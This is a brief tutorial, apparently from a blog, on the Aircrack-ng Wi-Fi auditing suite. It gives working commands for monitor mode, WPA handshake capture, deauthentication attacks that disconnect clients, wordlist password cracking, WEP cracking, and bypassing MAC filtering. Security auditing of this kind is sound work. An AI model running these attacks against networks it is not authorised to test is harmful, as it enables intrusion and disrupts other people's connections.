Aircrack-NG Guide

February 17, 2025

Introduction#

Aircrack-ng is a powerful suite of tools for auditing Wi-Fi network security. It includes tools for monitoring, attacking, testing, and cracking Wi-Fi networks.

Installation#

On Kali Linux (Pre-installed)#

sudo apt update && sudo apt install aircrack-ng

On Ubuntu/Debian#

sudo apt update && sudo apt install aircrack-ng

On Arch Linux#

sudo pacman -S aircrack-ng

On macOS (Using Homebrew)#

brew install aircrack-ng

Enabling Monitor Mode#

Before performing any attacks, you need to put your wireless interface in monitor mode.

Identify Wireless Interface#

ip a

OR

iwconfig

Enable Monitor Mode#

sudo airmon-ng start wlan0

This will create a new interface, usually named wlan0mon.

Disable Monitor Mode#

sudo airmon-ng stop wlan0mon

Common Attacks with Aircrack-ng#

1. Packet Capture (airodump-ng)#

sudo airodump-ng wlan0mon

This command scans for nearby networks and displays information like BSSID, ESSID, and encryption type.

Capture Handshake for WPA/WPA2 Cracking#

sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

Replace <channel> with the Wi-Fi channel and <BSSID> with the target AP’s BSSID.

2. Deauthentication Attack (aireplay-ng)#

Deauth attacks disconnect clients from the AP, forcing them to reconnect and potentially capture handshakes.

sudo aireplay-ng -0 10 -a <BSSID> -c <Client MAC> wlan0mon
  • -0 10: Sends 10 deauth packets
  • -a <BSSID>: Target AP’s MAC address
  • -c <Client MAC>: Specific client (optional, if omitted, all clients will be targeted)

3. WPA/WPA2 Password Cracking (aircrack-ng)#

Once the handshake is captured, use a wordlist to crack it:

sudo aircrack-ng -w <wordlist> -b <BSSID> capture.cap

Replace <wordlist> with a password list file (e.g., rockyou.txt).

4. WEP Cracking#

Collect IVs#

sudo airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon

Crack WEP Key#

sudo aircrack-ng -b <BSSID> wep_capture.cap

5. Fake Authentication Attack#

For bypassing MAC filtering and associating with a WEP network:

sudo aireplay-ng -1 0 -a <BSSID> -h <Your MAC> wlan0mon

Additional Aircrack-ng Tools#

  • airmon-ng - Puts Wi-Fi adapters into monitor mode.
  • airodump-ng - Captures packets and displays networks.
  • aireplay-ng - Injects packets for various attacks.
  • aircrack-ng - Cracks WEP/WPA passwords.
  • packetforge-ng - Creates custom packets for injection.
